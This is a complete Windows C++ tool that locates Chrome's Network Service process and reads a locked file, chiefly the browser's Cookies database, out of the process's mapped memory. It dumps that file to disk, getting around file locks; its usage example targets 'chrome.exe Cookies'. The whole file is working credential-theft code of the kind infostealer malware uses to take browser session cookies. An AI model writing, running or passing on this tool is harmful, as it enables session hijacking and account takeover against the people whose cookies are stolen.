#include <Windows.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <cstdio>
#include <new>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")

namespace IDontLikeFileLocks {

BOOL FindFileInMemory(HANDLE HProcess, const wchar_t* TargetFileName, LPVOID* OutBaseAddress, SIZE_T* OutRegionSize, BOOL Debug) {
    SYSTEM_INFO SystemInfo = {};
    ::GetSystemInfo(&SystemInfo);
    
    uintptr_t StartAddress = reinterpret_cast<uintptr_t>(SystemInfo.lpMinimumApplicationAddress);
    uintptr_t EndAddress = reinterpret_cast<uintptr_t>(SystemInfo.lpMaximumApplicationAddress);
    
    MEMORY_BASIC_INFORMATION MemoryInfo = {};
    
    while (StartAddress < EndAddress) {
        if (::VirtualQueryEx(HProcess, reinterpret_cast<LPCVOID>(StartAddress), &MemoryInfo, sizeof(MemoryInfo)) != sizeof(MemoryInfo)) {
            break;
        }
        
        if (MemoryInfo.State == MEM_COMMIT && 
            (MemoryInfo.Protect & PAGE_READONLY) != 0 && 
            MemoryInfo.Type == MEM_MAPPED) {
            
            wchar_t FullFileName[MAX_PATH] = {};
            DWORD FilenameLen = ::GetMappedFileNameW(HProcess, MemoryInfo.BaseAddress, FullFileName, MAX_PATH);
            
            if (FilenameLen > 0) {
                const wchar_t* FileName = ::PathFindFileNameW(FullFileName);
                
                if (Debug) {
                    wprintf(L"[DEBUG] Found: %s (0x%p, Size: 0x%llx)\n", 
                            FileName, MemoryInfo.BaseAddress, 
                            static_cast<unsigned long long>(MemoryInfo.RegionSize));
                }
                
                if (::_wcsicmp(FileName, TargetFileName) == 0) {
                    *OutBaseAddress = MemoryInfo.BaseAddress;
                    *OutRegionSize = MemoryInfo.RegionSize;
                    return TRUE;
                }
            }
        }
        
        StartAddress += MemoryInfo.RegionSize;
    }
    
    *OutBaseAddress = nullptr;
    *OutRegionSize = 0;
    return FALSE;
}

DWORD FindProcess(const wchar_t* ProcessName) {
    HANDLE Snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32W Entry = { sizeof(PROCESSENTRY32W) };
    
    if (!::Process32FirstW(Snapshot, &Entry)) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    DWORD Pid = 0;
    do {
        if (::_wcsicmp(Entry.szExeFile, ProcessName) == 0) {
            Pid = Entry.th32ProcessID;
            break;
        }
    } while (::Process32NextW(Snapshot, &Entry));
    
    ::CloseHandle(Snapshot);
    return Pid;
}

DWORD FindCookiesProcess(const wchar_t* BrowserExeName) {
    HANDLE Snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32W Entry = { sizeof(PROCESSENTRY32W) };
    
    if (!::Process32FirstW(Snapshot, &Entry)) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    DWORD ParentPid = IDontLikeFileLocks::FindProcess(BrowserExeName);
    if (!ParentPid) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    typedef NTSTATUS(NTAPI* NtQueryInformationProcessFunc)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    HMODULE Ntdll = ::GetModuleHandleW(L"ntdll.dll");
    if (!Ntdll) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    NtQueryInformationProcessFunc NtQIP = reinterpret_cast<NtQueryInformationProcessFunc>(
        ::GetProcAddress(Ntdll, "NtQueryInformationProcess"));
    
    if (!NtQIP) {
        ::CloseHandle(Snapshot);
        return 0;
    }
    
    DWORD CookiesPid = 0;
    
    do {
        if (Entry.th32ParentProcessID != ParentPid) {
            continue;
        }
        
        HANDLE HProc = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, Entry.th32ProcessID);
        if (!HProc) {
            continue;
        }
        
        PROCESS_BASIC_INFORMATION Pbi = {};
        ULONG Len = 0;
        
        if (NtQIP(HProc, 0, &Pbi, sizeof(Pbi), &Len) < 0) {
            ::CloseHandle(HProc);
            continue;
        }
        
        PEB Peb = {};
        SIZE_T BytesRead = 0;
        
        if (!::ReadProcessMemory(HProc, Pbi.PebBaseAddress, &Peb, sizeof(Peb), &BytesRead)) {
            ::CloseHandle(HProc);
            continue;
        }
        
        RTL_USER_PROCESS_PARAMETERS Params = {};
        BytesRead = 0;
        
        if (!::ReadProcessMemory(HProc, Peb.ProcessParameters, &Params, sizeof(Params), &BytesRead)) {
            ::CloseHandle(HProc);
            continue;
        }
        
        if (Params.CommandLine.Length == 0 || Params.CommandLine.Length >= sizeof(wchar_t) * 1024) {
            ::CloseHandle(HProc);
            continue;
        }
        
        wchar_t CommandLine[1024] = {};
        BytesRead = 0;
        
        if (!::ReadProcessMemory(HProc, Params.CommandLine.Buffer, CommandLine, Params.CommandLine.Length, &BytesRead)) {
            ::CloseHandle(HProc);
            continue;
        }
        
        if (::wcsstr(CommandLine, L"--type=utility") && 
            ::wcsstr(CommandLine, L"--utility-sub-type=network.mojom.NetworkService")) {
            CookiesPid = Entry.th32ProcessID;
            ::CloseHandle(HProc);
            break;
        }
        
        ::CloseHandle(HProc);
    } while (::Process32NextW(Snapshot, &Entry));
    
    ::CloseHandle(Snapshot);
    return CookiesPid;
}

int WMain(int Argc, wchar_t* Argv[]) {
    if (Argc < 3) {
        wprintf(L"Usage: %s <process> <filename> [output] [--debug]\n", Argv[0]);
        wprintf(L"Example: %s chrome.exe Cookies dump.db\n", Argv[0]);
        wprintf(L"Debug:   %s chrome.exe Cookies --debug\n", Argv[0]);
        return 1;
    }
    
    const wchar_t* ProcessName = Argv[1];
    const wchar_t* FileName = Argv[2];
    const wchar_t* OutputPath = (Argc >= 4 && ::wcscmp(Argv[3], L"--debug") != 0) ? Argv[3] : FileName;
    BOOL Debug = (Argc >= 4 && ::wcscmp(Argv[Argc - 1], L"--debug") == 0);
    
    wprintf(L"[*] Looking for process: %s\n", ProcessName);
    
    DWORD Pid = 0;
    
    if (::_wcsicmp(FileName, L"Cookies") == 0) {
        wprintf(L"[*] Cookies file detected - searching for Network Service process...\n");
        Pid = IDontLikeFileLocks::FindCookiesProcess(ProcessName);
        if (!Pid) {
            wprintf(L"[-] Network Service process not found\n");
            return 1;
        }
        wprintf(L"[+] Found Network Service PID: %d\n", Pid);
    } else {
        Pid = IDontLikeFileLocks::FindProcess(ProcessName);
        if (!Pid) {
            wprintf(L"[-] Process not found\n");
            return 1;
        }
        wprintf(L"[+] Found PID: %d\n", Pid);
    }
    
    HANDLE HProcess = ::OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, Pid);
    if (!HProcess) {
        wprintf(L"[-] Failed to open process: %d\n", ::GetLastError());
        return 1;
    }
    
    wprintf(L"[*] searching for file: %s\n", FileName);
    if (Debug) {
        wprintf(L"[*] dbg mode: listing all mapped files...\n\n");
    }
    
    LPVOID BaseAddress = nullptr;
    SIZE_T RegionSize = 0;
    
    if (!IDontLikeFileLocks::FindFileInMemory(HProcess, FileName, &BaseAddress, &RegionSize, Debug)) {
        wprintf(L"\n[-] File not found in process memory\n");
        ::CloseHandle(HProcess);
        return 1;
    }
    
    wprintf(L"[+] Found at: 0x%p (Size: 0x%llx)\n", BaseAddress, static_cast<unsigned long long>(RegionSize));
    
    BYTE* Buffer = new(std::nothrow) BYTE[RegionSize];
    if (!Buffer) {
        wprintf(L"[-] Failed to allocate memory\n");
        ::CloseHandle(HProcess);
        return 1;
    }
    
    SIZE_T BytesRead = 0;
    if (!::ReadProcessMemory(HProcess, BaseAddress, Buffer, RegionSize, &BytesRead) || BytesRead != RegionSize) {
        wprintf(L"[-] Failed to read memory: %d\n", ::GetLastError());
        delete[] Buffer;
        ::CloseHandle(HProcess);
        return 1;
    }
    
    wprintf(L"[+] Read 0x%llx bytes from memory\n", static_cast<unsigned long long>(BytesRead));
    
    wchar_t TempPath[MAX_PATH] = {};
    const wchar_t* FileNameOnly = ::PathFindFileNameW(OutputPath);
    
    ::GetTempPathW(MAX_PATH, TempPath);
    ::wcscat_s(TempPath, MAX_PATH, FileNameOnly);
    
    HANDLE HFile = ::CreateFileW(TempPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (HFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to create temp file '%s': %d\n", TempPath, ::GetLastError());
        wprintf(L"[*] Attempting to write to current directory instead...\n");
        
        HFile = ::CreateFileW(FileNameOnly, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (HFile == INVALID_HANDLE_VALUE) {
            wprintf(L"[-] Failed to create output file '%s': %d\n", FileNameOnly, ::GetLastError());
            delete[] Buffer;
            ::CloseHandle(HProcess);
            return 1;
        }
        ::wcscpy_s(TempPath, MAX_PATH, FileNameOnly);
    }
    
    DWORD Written = 0;
    if (!::WriteFile(HFile, Buffer, static_cast<DWORD>(RegionSize), &Written, nullptr) || Written != RegionSize) {
        wprintf(L"[-] Failed to write file: %d\n", ::GetLastError());
        ::CloseHandle(HFile);
        delete[] Buffer;
        ::CloseHandle(HProcess);
        return 1;
    }
    
    wprintf(L"[+] Successfully dumped to: %s\n", TempPath);
    
    ::CloseHandle(HFile);
    delete[] Buffer;
    ::CloseHandle(HProcess);
    return 0;
}

}

int wmain(int argc, wchar_t* argv[]) {
    return IDontLikeFileLocks::WMain(argc, argv);
}
